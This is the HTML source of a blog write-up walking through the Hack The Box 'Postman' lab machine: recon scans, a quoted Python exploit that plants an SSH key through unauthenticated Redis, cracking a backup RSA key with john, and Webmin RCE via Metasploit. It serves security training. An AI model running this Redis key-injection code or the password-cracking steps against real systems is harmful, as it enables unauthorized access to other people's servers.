@@ -1,0 +1,483 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Postman - Hack The Box</title>
+  <meta name="description" content="Resolution of the Postman machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Postman - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/postman">
+  <meta property="og:description" content="Resolution of the Postman machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/postman">
+  <meta name="twitter:title" content="Postman - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Postman machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/postman/postman-00-0a67c1f151b529261fefd961b46893a37a1fbdfdd0c53486d3d958c1d9b8aa82.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/postman/postman-00-0a67c1f151b529261fefd961b46893a37a1fbdfdd0c53486d3d958c1d9b8aa82.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Postman - Hack The Box</h1>
+            <p>Resolution of the Postman machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 24, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      7 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/postman/postman-00-0a67c1f151b529261fefd961b46893a37a1fbdfdd0c53486d3d958c1d9b8aa82.png">
+  <img src="/assets/hackthebox/postman/postman-00-0a67c1f151b529261fefd961b46893a37a1fbdfdd0c53486d3d958c1d9b8aa82.png" alt="Postman banner" class="zooming" data-rjs="/assets/hackthebox/postman/postman-00-0a67c1f151b529261fefd961b46893a37a1fbdfdd0c53486d3d958c1d9b8aa82.png" data-zooming-width="596" data-zooming-height="379" />
+</a></p>
+
+<p>Postman is an easy level machine based on Linux, the initial approach is based on a CVE that exploits the <code class="highlighter-rouge">Redis without authentication</code>. The privilege escalation stage it’s necessary to do some enumerations in order to identify a system backup file to crack the classical Linux password format. The second stage of the privilege escalation stage is based on a web application exploitation.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Sun Feb  2 19:24:26 2020 as: nmap -sC -sV -oA postman -T4 -p- 10.10.10.160</span>
+Warning: 10.10.10.160 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>postman.htb <span class="o">(</span>10.10.10.160<span class="o">)</span>
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Cyber Geek<span class="s1">'s Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Feb  2 19:40:23 2020 -- 1 IP address (1 host up) scanned in 957.17 seconds</span></code></pre></figure>
+
+<p>Starting with the port 80:</p>
+
+<p><a href="/assets/hackthebox/postman/postman-01-30e9b6e4f183b3a11601a81639bb6f226dbfd6de872b234b3b7cf8bd48bcc8e2.png">
+  <img src="/assets/hackthebox/postman/postman-01-30e9b6e4f183b3a11601a81639bb6f226dbfd6de872b234b3b7cf8bd48bcc8e2.png" alt="Postman Recon" class="zooming" data-rjs="/assets/hackthebox/postman/postman-01-30e9b6e4f183b3a11601a81639bb6f226dbfd6de872b234b3b7cf8bd48bcc8e2.png" data-zooming-width="1149" data-zooming-height="538" />
+</a></p>
+
+<p>Enumerating the web server with gobuster tool results in the following response:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.160 <span class="nt">-t</span> 25
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.160
+<span class="o">[</span>+] Threads:        25
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/02/02 19:25:50 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/css <span class="o">(</span>Status: 301<span class="o">)</span>
+/fonts <span class="o">(</span>Status: 301<span class="o">)</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/upload <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/02/02 19:27:56 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">/upload</code> directory is empty.</p>
+
+<h1 id="exploiting---exploit-adaptation">Exploiting - Exploit adaptation</h1>
+
+<p>Starting with the web application located at port 1000 we have a web application named <code class="highlighter-rouge">Webmin version 1.910</code>, searching for any exploit on Google we got:</p>
+
+<p><a href="https://www.exploit-db.com/exploits/46984" target="_blank">Webmin 1.910 - ‘Package Updates’ Remote Command Execution (Metasploit) </a></p>
+
+<p>Unfortunately this exploit only works with an <code class="highlighter-rouge">authenticated</code> session, we need the credentials.
+Going on for the next port we noticed that there’s a Redis service running. Searching for any exploits that suits the version 4.0.9, the exploit works with the following logic:</p>
+
+<ul>
+  <li>Creates the RSA keys for SSH</li>
+  <li>Send them to Redis (without password)</li>
+  <li>Save the keys at <code class="highlighter-rouge">authorized_keys</code> with redis-cli command</li>
+  <li>Login through SSH without password</li>
+</ul>
+
+<p><a href="https://github.com/Avinash-acid/Redis-Server-Exploit" target="_blank">Redis-Server-Exploit</a></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+#Author : Avinash Kumar Thapa aka -Acid
+#Twitter : https://twitter.com/m_avinash143
+#####################################################################################################################################################
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">os.path</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+
+
+<span class="n">script</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">argv</span>
+
+
+<span class="n">PATH</span><span class="o">=</span><span class="s">'/usr/bin/redis-cli'</span>
+<span class="n">PATH1</span><span class="o">=</span><span class="s">'/usr/local/bin/redis-cli'</span>
+
+<span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">():</span>
+  <span class="n">shell</span> <span class="o">=</span> <span class="s">"ssh -i "</span> <span class="o">+</span> <span class="s">'$HOME/.ssh/id_rsa '</span> <span class="o">+</span> <span class="n">username</span><span class="o">+</span><span class="s">"@"</span><span class="o">+</span><span class="n">ip_address</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH1</span><span class="p">):</span>
+  <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">*******************************************************************'</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">* [+] [Exploit] Exploiting misconfigured REDIS SERVER*'</span> <span class="p">,</span><span class="s">"green"</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">* [+] AVINASH KUMAR THAPA aka "-Acid"                                '</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">*******************************************************************'</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s"> SSH Keys Need to be Generated"</span><span class="p">,</span> <span class="s">'blue'</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ssh-keygen -t rsa -C </span><span class="se">\"</span><span class="s">acid_creative</span><span class="se">\"</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s"> Keys Generated Successfully"</span><span class="p">,</span> <span class="s">"blue"</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"(echo '</span><span class="se">\r\n\'</span><span class="s">; cat $HOME/.ssh/id_rsa.pub; echo  </span><span class="se">\'\r\n\'</span><span class="s">) &gt; $HOME/.ssh/public_key.txt"</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"redis-cli -h "</span> <span class="o">+</span> <span class="n">ip_address</span> <span class="o">+</span> <span class="s">' flushall'</span>
+    <span class="n">cmd1</span> <span class="o">=</span> <span class="s">"redis-cli -h "</span> <span class="o">+</span> <span class="n">ip_address</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">cmd2</span> <span class="o">=</span> <span class="s">"cat $HOME/.ssh/public_key.txt | redis-cli -h "</span> <span class="o">+</span>  <span class="n">ip_address</span> <span class="o">+</span> <span class="s">' -x set cracklist'</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd2</span><span class="p">)</span>
+    <span class="n">cmd3</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s">' config set dbfilename "backup.db" '</span>
+    <span class="n">cmd4</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s">' config set  dir'</span> <span class="o">+</span> <span class="s">" /home/"</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s">"/.ssh/"</span>
+    <span class="n">cmd5</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s">' config set dbfilename "authorized_keys" '</span>
+    <span class="n">cmd6</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s">' save'</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd3</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd4</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd5</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd6</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">You'll get shell in sometime..Thanks for your patience"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+    <span class="n">ssh_connection</span><span class="p">()</span>
+
+  <span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Something went wrong"</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Redis-cli:::::This utility is not present on your system. You need to install it to proceed further."</span><span class="p">,</span> <span class="s">"red"</span><span class="p">)</span></code></pre></figure>
+
+<p>In order to make it work, we need to replace the line 39 with:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">cmd4</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s">' config set  dir'</span> <span class="o">+</span> <span class="s">" /var/lib/redis/.ssh/"</span></code></pre></figure>
+
+<p>Explanation: The redis home is actually different from the usual (<code class="highlighter-rouge">/home/redis/</code>)</p>
+
+<p>After that we’re able to gain access to the machine through SSH as redis user!</p>
+
+<p><a href="/assets/hackthebox/postman/postman-02-b96f8b3af2d4e58d67b46fe7f14635e9933467fc4032d5ffc5746c761a0451c6.png">
+  <img src="/assets/hackthebox/postman/postman-02-b96f8b3af2d4e58d67b46fe7f14635e9933467fc4032d5ffc5746c761a0451c6.png" alt="Postman Exploiting" class="zooming" data-rjs="/assets/hackthebox/postman/postman-02-b96f8b3af2d4e58d67b46fe7f14635e9933467fc4032d5ffc5746c761a0451c6.png" data-zooming-width="558" data-zooming-height="478" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that generates the RSA key, send them to redis, throw em to the authorized_keys file and spawn a shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/postman" target="_blank">Postman Exploit</a></p>
+
+<p><a href="/assets/hackthebox/postman/postman-03-57bf23924ee5a2bd41b5b4c7eadf981d187b9286142f42d0b0d282975b9d35f5.png">
+  <img src="/assets/hackthebox/postman/postman-03-57bf23924ee5a2bd41b5b4c7eadf981d187b9286142f42d0b0d282975b9d35f5.png" alt="Postman Exploit" class="zooming" data-rjs="/assets/hackthebox/postman/postman-03-57bf23924ee5a2bd41b5b4c7eadf981d187b9286142f42d0b0d282975b9d35f5.png" data-zooming-width="710" data-zooming-height="377" />
+</a></p>
+
+<h1 id="post-exploitation---escalating-through-multiple-users">Post Exploitation - Escalating through multiple users</h1>
+
+<p>The next step is to enumerate the machine in search of any entry point for our privilege escalation.
+There’s a backup file at <code class="highlighter-rouge">/opt/id_rsa.bak</code> that appears to be a legitime RSA private key:</p>
+
+<blockquote>
+  <p>—–BEGIN RSA PRIVATE KEY—–</p>
+
+  <p>Proc-Type: 4,ENCRYPTED DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</p>
+
+  <p>JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2 7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6 cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9 1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS 5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6 jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X 0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+ Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</p>
+
+  <p>—–END RSA PRIVATE KEY—–</p>
+</blockquote>
+
+<p>Unfortunately in order to <code class="highlighter-rouge">johntheripper</code> crack any RSA file, an additional tool named <code class="highlighter-rouge">ssh2john</code> is needed:</p>
+
+<p><a href="https://fossies.org/linux/john/run/ssh2john.py" target="_blank">ssh2john</a></p>
+
+<figure class="highlight"><pre><code class="language-ssh" data-lang="ssh">python ssh2john.py matt_privkey.txt &gt; matt_privkey.hash</code></pre></figure>
+
+<p>Then we run john:</p>
+
+<figure class="highlight"><pre><code class="language-ssh" data-lang="ssh">john --wordlist /usr/share/wordlists/rockyou.txt matt_privkey.hash</code></pre></figure>
+
+<p>After a couple time we got the Matt user password: <code class="highlighter-rouge">computer2008</code></p>
+
+<p><a href="/assets/hackthebox/postman/postman-04-c984c2e4b0ae96402af0e6f6f7b3fb1e3b418565df10e8bac189aefae7bab53a.png">
+  <img src="/assets/hackthebox/postman/postman-04-c984c2e4b0ae96402af0e6f6f7b3fb1e3b418565df10e8bac189aefae7bab53a.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-04-c984c2e4b0ae96402af0e6f6f7b3fb1e3b418565df10e8bac189aefae7bab53a.png" data-zooming-width="314" data-zooming-height="63" />
+</a></p>
+
+<p>The first flag is captured and we need to move on!</p>
+
+<p><a href="/assets/hackthebox/postman/postman-05-f424753201c8f24e48f4c0e56cda15f01eaa5d6164d095150c4c16e30fa2f595.png">
+  <img src="/assets/hackthebox/postman/postman-05-f424753201c8f24e48f4c0e56cda15f01eaa5d6164d095150c4c16e30fa2f595.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-05-f424753201c8f24e48f4c0e56cda15f01eaa5d6164d095150c4c16e30fa2f595.png" data-zooming-width="355" data-zooming-height="83" />
+</a></p>
+
+<p>Now enumerating the system again, as Matt user we noticed that the root user is executing a web application named <code class="highlighter-rouge">Webmin</code>:</p>
+
+<p><a href="/assets/hackthebox/postman/postman-11-9b0e330282ca522bf97fd0d2ec5cf3576b91ac171c8a40245652b6b9f36bf799.png">
+  <img src="/assets/hackthebox/postman/postman-11-9b0e330282ca522bf97fd0d2ec5cf3576b91ac171c8a40245652b6b9f36bf799.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-11-9b0e330282ca522bf97fd0d2ec5cf3576b91ac171c8a40245652b6b9f36bf799.png" data-zooming-width="954" data-zooming-height="16" />
+</a></p>
+
+<p>Reusing the Matt’s password on Webmin’s panel works and now we have access to the administrator’s panel:</p>
+
+<p><a href="/assets/hackthebox/postman/postman-06-fd2ac7fcdbed45eed77ec9e5c0eaf4af6cd563a3064a42a2e9e107282adce328.png">
+  <img src="/assets/hackthebox/postman/postman-06-fd2ac7fcdbed45eed77ec9e5c0eaf4af6cd563a3064a42a2e9e107282adce328.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-06-fd2ac7fcdbed45eed77ec9e5c0eaf4af6cd563a3064a42a2e9e107282adce328.png" data-zooming-width="964" data-zooming-height="510" />
+</a></p>
+
+<p><a href="/assets/hackthebox/postman/postman-07-22884da8fc6b501b7246b185f2ea32b98dbf228b771d98beade7c4a00aa4dc7e.png">
+  <img src="/assets/hackthebox/postman/postman-07-22884da8fc6b501b7246b185f2ea32b98dbf228b771d98beade7c4a00aa4dc7e.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-07-22884da8fc6b501b7246b185f2ea32b98dbf228b771d98beade7c4a00aa4dc7e.png" data-zooming-width="1181" data-zooming-height="553" />
+</a></p>
+
+<p>Going back to the authenticated exploit that we’ve seen early, this exploit uses the Webmin module named <code class="highlighter-rouge">Package Updates</code> to inject system commands.</p>
+
+<p><a href="/assets/hackthebox/postman/postman-08-917ef820249ba5405e271a7130d02be150603347b64fa06754b23baeaecd2ca8.png">
+  <img src="/assets/hackthebox/postman/postman-08-917ef820249ba5405e271a7130d02be150603347b64fa06754b23baeaecd2ca8.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-08-917ef820249ba5405e271a7130d02be150603347b64fa06754b23baeaecd2ca8.png" data-zooming-width="993" data-zooming-height="549" />
+</a></p>
+
+<p>So now all we need to do is select the metasploit module named <code class="highlighter-rouge">linux/http/webmin_packageup_rce</code>:</p>
+
+<p><a href="/assets/hackthebox/postman/postman-09-32df40b3ab47a3f491384d3d0f0a02cc1c1696433ba89f908ccb1265140c1549.png">
+  <img src="/assets/hackthebox/postman/postman-09-32df40b3ab47a3f491384d3d0f0a02cc1c1696433ba89f908ccb1265140c1549.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-09-32df40b3ab47a3f491384d3d0f0a02cc1c1696433ba89f908ccb1265140c1549.png" data-zooming-width="745" data-zooming-height="324" />
+</a></p>
+
+<p>Now we have escalated our privileges to root!</p>
+
+<h1 id="post-exploitation---using-a-custom-exploit">Post Exploitation - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that authenticate on Webmin panel and inject the payload on the vulnerable package module, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/postman" target="_blank">Postman Exploit</a></p>
+
+<p><a href="/assets/hackthebox/postman/postman-10-2de653c78252d8dfc406b852db59640a2d6cce71a9e9ee36f9e5ca7c5bc652d5.png">
